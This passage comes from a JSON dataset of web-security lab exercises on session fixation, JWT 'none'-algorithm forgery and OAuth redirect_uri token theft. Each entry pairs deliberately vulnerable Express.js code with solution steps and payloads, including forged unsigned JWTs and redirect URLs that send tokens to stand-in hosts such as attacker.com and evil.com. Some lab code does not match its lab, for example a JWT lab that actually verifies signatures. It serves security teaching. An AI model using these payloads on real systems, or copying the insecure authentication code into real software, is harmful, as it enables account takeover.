      "Authorization: Bearer carlos-token-123",
      "https://attacker.com/capture?token=carlos-token-123"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set cookie",
    "Lab Description": "The application fails to regenerate the session ID after authentication. An attacker can set a session ID for the victim, then trick them into logging in with it. This allows session hijacking. To solve: set a session cookie for Carlos, wait for login, then reuse it to access the account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request with a custom session ID: Cookie: session=attack-session.",
      "Trick Carlos into clicking a crafted login link with the session cookie preset (e.g., via email).",
      "Carlos logs in, binding his account to 'attack-session'.",
      "Replay the session by reusing 'attack-session' as the cookie value.",
      "Access /my-account and confirm session fixation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecure' }; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { return res.send('Welcome back Carlos'); } res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attack-session",
      "POST /login with session=attack-session and Carlos credentials",
      "GET /my-account with Cookie: session=attack-session"
    ]
  }
  ,
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization Header",
    "Lab Description": "This lab has an authentication mechanism based on JWTs which are stored and verified insecurely. The application decodes the JWT but fails to validate its signature. This allows a user to modify the token payload and gain unauthorized access. To solve: Tamper with a JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a request containing the JWT using Burp Suite and inspect the Authorization header.",
      "Decode the JWT at jwt.io and confirm that the signature is either 'none' or not validated server-side.",
      "Modify the payload to set \"role\": \"admin\" and set the alg header to \"none\".",
      "Remove the signature entirely and re-encode the header and payload using base64url.",
      "Replace the original token in the Authorization header and send a GET request to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }]; app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session ID in Cookie",
    "Lab Description": "This lab's session management is vulnerable due to the use of predictable session identifiers that are not regenerated after login. The application uses static session tokens which remain valid after authentication, allowing an attacker to fix a session ID for the victim. To solve: Set a known session ID, trick the victim into logging in, then hijack the session and access the account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to initiate a session and capture the Set-Cookie header using Burp Suite.",
      "Manually set a known session ID (e.g., session=attacker123) using Postman or Burp.",
      "Send the crafted link with the known session ID to the victim (simulated in lab setup).",
      "After the victim logs in, reuse the same session ID in your browser.",
      "Send a GET /account request with the known cookie to access the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.cookies.session; if (!sid) { sid = req.query.sid || Math.random().toString(36).substring(2); res.cookie('session', sid); } req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username } = req.body; sessions[req.sessionID] = { username }; res.send('Logged in'); }); app.get('/account', (req, res) => { const user = sessions[req.sessionID]; if (user) res.send(`Account page of ${user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "session=attacker123",
      "session=sharedToken42",
      "session=testsession001"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect_uri",
    "Lab Description": "This lab features a misconfigured OAuth flow that fails to validate redirect_uri strictly, allowing an attacker to intercept tokens by exploiting open redirect behavior. The application integrates with an OAuth provider for authentication. To solve: Exploit the misconfiguration to capture Carlos’s access token via an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate the OAuth flow and observe the redirect_uri parameter using Burp Suite.",
      "Modify redirect_uri to an attacker-controlled domain while preserving the base domain.",
      "Host a simple token-stealing page that logs query parameters (e.g., access_token).",
      "Send the malicious link to the victim (simulated within lab).",
      "Access the captured token from logs and replay it to impersonate the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokenStore = { 'carlos': 'abcd123token' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const accessToken = tokenStore['carlos']; const redirectUrl = `${redirect_uri}?access_token=${accessToken}&state=${state}`; res.redirect(redirectUrl); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === tokenStore['carlos']) res.send('Carlos Profile Page'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/capture",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/oauth-callback",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/redirect&state=xyz"
    ]
  }
,
{
    "Lab scenario": "JWT tampering to escalate privileges in API access",
    "Lab Description": "This lab features a RESTful API that uses JWTs for authentication. The backend accepts unsigned JWTs due to a missing verification check. The application uses the 'role' claim to restrict access to administrative endpoints. To solve: forge a JWT granting admin access and retrieve the sensitive data from the /admin/report endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture JWT using Burp Suite when logged in as a normal user",
      "Send token to jwt.io or use jwt_tool to inspect token structure and verify the 'alg' header is set to 'none'",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set alg to 'none'",
      "Remove the signature entirely, rebase64 the header and payload, and reconstruct the JWT",
      "Send request to /admin/report with the forged token in Authorization header to access protected resource"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/api/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'none' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Sensitive admin report data'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  }
,
{
    "Lab scenario": "Session fixation in login redirection flow",
    "Lab Description": "The application uses a session cookie to manage authenticated users, but fails to issue a new session identifier upon successful login. An attacker can preset a session ID for the victim, then trick them into authenticating with it. To solve: hijack Carlos’s session by forcing him to log in using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a session with a custom session ID using Burp (e.g., Cookie: session=attacker123)",
      "Browse to the login endpoint and log in using your own credentials with the crafted session ID",
      "Send the session URL to Carlos (e.g., /login?redirect=/my-account with cookie=session=attacker123)",
      "Wait for Carlos to log in; session cookie remains attacker123 due to missing regeneration",
      "Use the same session cookie (attacker123) to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'secret123' } }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username].password === password) { res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') { res.send('Welcome Carlos, here is your account'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Cookie: session=attacker123",
      "/login?username=carlos&password=secret123",
      "/my-account with Cookie: session=attacker123"
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow token leakage via referrer header",
    "Lab Description": "The application uses an OAuth 2.0 implicit flow and places access tokens in the URL fragment. However, a redirect to a third-party domain causes the access token to leak via the Referer header. To solve: capture Carlos’s token via a malicious redirect and use it to access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login flow and observe token returned in URL fragment (e.g., #access_token=xyz)",
      "Craft a redirect_uri to attacker.com/capture that causes the browser to send the Referer with the full URL",
      "Send phishing link to Carlos containing redirect_uri=https://attacker.com/capture",
      "Set up HTTP listener on attacker.com to capture Referer with access token",
      "Use captured access token in Authorization header to call /api/user-data as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send(`<script>window.location='https://attacker.com/capture#' + window.location.hash.substr(1);</script>`); }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-access-token') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/oauth/callback#access_token=carlos-access-token",
      "Referer: https://target.com/oauth/callback#access_token=carlos-access-token",
      "Authorization: Bearer carlos-access-token"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion vulnerability in login endpoint",
    "Lab Description": "The application's login mechanism uses JSON Web Tokens for session management but fails to validate the algorithm field properly. The application blindly trusts tokens signed with 'none' as valid. To solve: gain access to Carlos's account by forging a valid token without knowing the secret.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm value in the header is set to HS256.",
      "Modify the algorithm to 'none' and remove the signature portion of the token.",
      "Change the payload section to {\"username\":\"carlos\"} and re-encode the token with no signature.",
      "Replay the request with the forged JWT in the Authorization header and access the /my-account endpoint to verify success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') res.send('Welcome carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow token leakage via redirect URI",
    "Lab Description": "This lab's OAuth implementation uses an implicit grant flow that leaks the access token in the redirect URI. The application does not sanitize or securely handle fragment identifiers, allowing an attacker to steal tokens via referer headers. To solve: extract Carlos's token and use it to access his protected profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to proxy a login via OAuth and capture the redirection URI that includes the access token.",
      "Observe that the access token appears in the URL fragment (e.g., #access_token=XYZ).",
      "Inject a redirect URI during the OAuth handshake that points to your attacker server and logs the fragment token.",
      "Once Carlos logs in via the crafted link, intercept the token on your server via HTTP referer or browser-side script.",
      "Use the stolen token in an Authorization header to access /user/profile and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token-abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token-abc123') res.send('Carlos Profile'); else res.status(403).send('Access denied'); }); app.listen(4001, () => console.log('OAuth Token Leak Lab running...'));",
    "payloads": [
      "https://attacker.com/callback#access_token=carlos-oauth-token-abc123",
      "Authorization: Bearer carlos-oauth-token-abc123"
    ]
  }
,
{
    "Lab scenario": "Session fixation vulnerability in change-password endpoint",
    "Lab Description": "The application assigns a new session cookie upon login, but the session is not properly regenerated after sensitive operations. This allows an attacker to fix a session ID before victim login. To solve: set a session for Carlos before he logs in and hijack his session after he changes his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Postman, initiate a GET /session with a custom session ID and send it to the victim via social engineering.",
      "Once the victim logs in, reuse the same session cookie to validate it has been fixed.",
      "Capture the request when the victim changes their password — session ID remains unchanged.",
      "Replay the session cookie in your browser or client to hijack the victim's session.",
      "Access /my-account with the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'oldpass' }]; app.get('/session', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substring(7); sessions[sid] = null; res.cookie('sid', sid); res.send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); sessions[sid] = username; res.send('Logged in'); }); app.post('/change-password', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) { users.find(u => u.username === user).password = req.body.newPassword; res.send('Password changed'); } else res.status(403).send('Not logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] === 'carlos') res.send('Welcome carlos'); else res.send('Access denied'); }); app.listen(4002, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "GET /session?sid=attackerfixed123",
      "Cookie: sid=attackerfixed123",
      "POST /login with sid=attackerfixed123",
      "POST /change-password with sid=attackerfixed123"
    ]
  }
,
{
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header",
    "Lab Description": "This lab demonstrates a misconfigured JWT validation mechanism where the application fails to verify token signatures if the algorithm is set to 'none'. The application trusts JWTs from the Authorization header for user session validation. To solve: Forge a JWT for the admin user by modifying the algorithm to 'none' and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to send a valid login request and capture the returned JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io and observe that the algorithm is 'HS256'.",
      "3. Modify the JWT header to set \"alg\":\"none\" and change the payload's \"username\" to \"admin\".",
      "4. Remove the signature portion of the JWT and reconstruct the token using only header.payload.",
      "5. Use Burp Repeater to send a GET request to /admin-dashboard with the forged JWT in the Authorization header.",
      "6. If successful, the admin dashboard will load, confirming that the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 's3cret'; app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') return res.send('Welcome admin!'); else return res.status(403).send('Access denied'); } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation via Unvalidated Session ID in URL",
    "Lab Description": "This lab illustrates session fixation where the server accepts any arbitrary session ID supplied via a URL query parameter without validation or regeneration on login. The application does not issue a new session ID after successful authentication. To solve: Fix the victim's session ID before login, then log in with their credentials and access the profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login?sessionId=attacker-session request and send it to Repeater.",
      "2. Visit the /register endpoint and create a dummy account using the attacker-session value as the session cookie.",
      "3. Log out and convince the victim (Carlos) to click a crafted link: /login?sessionId=attacker-session.",
      "4. Use Burp to replay the login request for Carlos with the sessionId attacker-session and his credentials.",
      "5. Access /my-account while using the same session ID to confirm access to Carlos's profile page.",
      "6. The lab is solved when you view Carlos's account details with a fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospw' }]; app.get('/login', (req, res) => { const sessionId = req.query.sessionId; sessions[sessionId] = null; res.send(`<form method='POST' action='/authenticate?sessionId=${sessionId}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/authenticate', (req, res) => { const sessionId = req.query.sessionId; let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); const user = users.find(u => u.username === params.get('username') && u.password === params.get('password')); if (user) { sessions[sessionId] = user.username; res.redirect(`/my-account?sessionId=${sessionId}`); } else { res.status(403).send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sessionId = req.query.sessionId; const user = sessions[sessionId]; if (user) res.send(`Welcome ${user}, this is your account`); else res.status(403).send('Not logged in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "/login?sessionId=attacker-session",
      "/authenticate?sessionId=attacker-session",
      "/my-account?sessionId=attacker-session"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "This lab showcases an OAuth implementation vulnerable to an open redirect flaw in its redirect_uri parameter. The authorization server fails to strictly validate redirect URIs, allowing attackers to hijack authorization codes. To solve: Trick the victim into authorizing your application, intercept the OAuth code via a malicious redirect URI, and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to scan the /authorize?redirect_uri parameter for weak validation patterns.",
      "2. Discover that the app accepts subdomains of example.com and permits wildcard matching.",
      "3. Create a payload with redirect_uri=https://attacker.example.com/callback and register a listener.",
      "4. Trick the victim into clicking a crafted URL to initiate OAuth flow: /authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code.",
      "5. Capture the authorization code on your listener, then POST it to /oauth/token to retrieve the access token.",
      "6. Use the access token to access /profile with Authorization: Bearer <token> and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validClients = ['trusted-client']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); if (redirect_uri.includes('.example.com')) { const authCode = 'authcode-carlos'; res.redirect(`${redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid redirect'); } }); app.post('/oauth/token', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk; }); req.on('end', () => { const params = new URLSearchParams(body); if (params.get('code') === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(403).send('Invalid code'); }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome back, Carlos. Here is your profile.'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "/authorize?client_id=trusted-client&redirect_uri=https://attacker.example.com/callback&response_type=code",
      "POST /oauth/token with code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  }
  ,
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "This lab implements stateless authentication using JWTs passed in the Authorization header. The backend fails to validate the algorithm used in the JWT header. The application trusts any token as long as the signature structure is present. To solve: Forge a JWT that grants access to Carlos’s account using the 'none' algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the Authorization header during login using Burp Suite.",
      "Send the token to jwt.io or manually decode it to inspect its header and payload.",
      "Modify the JWT header by changing 'alg' to 'none' and removing the signature.",
      "Manually update the payload to impersonate the user 'carlos'.",
      "Use Postman to craft a new request with the forged Authorization header and access /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'admin' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Unauthorized'); res.send(`Welcome ${decoded.payload.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "Open redirect abuse in OAuth flow for token theft",
    "Lab Description": "The lab uses OAuth to authenticate users via a third-party provider. The 'redirect_uri' parameter is not properly validated, allowing attackers to intercept the access token after successful login. To solve: Capture the access token issued to Carlos by abusing the redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate the OAuth login and intercept the authorization request using Burp Suite.",
      "Modify the 'redirect_uri' parameter to point to your attacker-controlled server (e.g. https://attacker.com/callback).",
      "Start a listener on the attacker-controlled server to capture redirected URLs.",
      "Share the malicious OAuth link with Carlos and wait for him to authenticate.",
      "Extract the access_token from the captured URL fragment and use it with Postman to call /my-account with Authorization: Bearer <token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123_for_carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token123_for_carlos') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vuln-site.com/auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback#access_token=token123_for_carlos",
      "Authorization: Bearer token123_for_carlos"
    ]
  }
,
{
    "Lab scenario": "Session fixation using static token in cookie",
    "Lab Description": "The app issues session cookies with predictable static values tied to usernames, and fails to regenerate sessions on login. Attackers can set a valid cookie before login, leading to session fixation. To solve: Fix Carlos’s session, then use the token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to inspect the Set-Cookie value on your own login and note its static structure (e.g., session=<username>_token).",
      "Manually craft a session cookie as 'session=carlos_token' and inject it using Burp or Postman.",
      "Share a crafted login URL with Carlos that preserves the malicious session.",
      "Wait for Carlos to authenticate using your crafted session.",
      "Revisit /my-account with the same cookie to confirm session fixation and access Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = ['alice', 'carlos']; app.get('/login', (req, res) => { const { username } = req.query; if (users.includes(username)) { res.cookie('session', `${username}_token`); res.send('Logged in'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') res.send('Welcome carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=carlos_token",
      "https://vuln-app.com/login?username=carlos",
      "Set-Cookie: session=carlos_token"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion in REST API authentication",
    "Lab Description": "The backend uses JSON Web Tokens (JWT) for stateless authentication and incorrectly accepts tokens signed with 'none' algorithm. The application fails to validate the token signature properly, allowing attackers to forge tokens. To solve: Forge an admin JWT and access the /admin/dashboard endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to log in as a regular user and capture the JWT from the Authorization header.",
      "Use jwt.io to decode the token and observe it uses HS256 algorithm.",
      "Craft a new JWT with the same payload but change the 'alg' to 'none' and remove the signature.",
      "Replace the original JWT in Burp with the modified unsigned token and set 'role' to 'admin'.",
      "Send a request to GET /admin/dashboard and confirm admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin access granted'); } const verified = jwt.verify(token, SECRET); if (verified.role === 'admin') return res.send('Admin access granted'); } catch (e) { return res.status(403).send('Invalid token'); } res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{alg: 'none', payload: { username: 'carlos', role: 'admin' }}",
      "Authorization: Bearer <forged-jwt>"
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "The application assigns session tokens before authentication and fails to regenerate them post-login. This allows attackers to fix a session ID for the victim and hijack the session. To solve: Fix a session for Carlos, let him authenticate, then access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to initiate a session and capture your session ID from the Set-Cookie header.",
      "Share the fixed session ID link with the victim, e.g., /login?sessionid=abc123.",
      "Assume the victim logs in via the crafted link and binds the session to their authenticated context.",
      "Send a GET /my-account request with the fixed session ID in Cookie header.",
      "Access Carlos’s account details to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { let sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Login failed'); const sid = req.cookies.sessionid; sessions[sid] = { username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) return res.send(`Account: ${sessions[sid].username}`); res.send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login?sessionid=fixed123",
      "Cookie: sessionid=fixed123",
      "POST /login with body: username=carlos&password=letmein",
      "GET /my-account with Cookie: sessionid=fixed123"
    ]
  }
,
{
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "The OAuth flow accepts a wide range of redirect URIs without strict validation. This allows an attacker to inject malicious domains to capture authorization codes. To solve: Exploit the open redirect to capture Carlos’s OAuth token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login and intercept the request to the /auth endpoint using Burp.",
      "Modify the redirect_uri parameter to point to your malicious server (e.g., https://evil.com/callback).",
      "Host a listener on https://evil.com/callback to capture the code from query string.",
      "Exchange the stolen code for a token using the /oauth/token endpoint.",
      "Use the token to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const authorizedRedirects = []; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?code=auth123`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'auth123') return res.json({ access_token: 'token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') return res.send('Carlos account details'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "GET /auth?redirect_uri=https://evil.com/callback",
      "https://evil.com/callback?code=auth123",
      "POST /oauth/token with body: code=auth123",
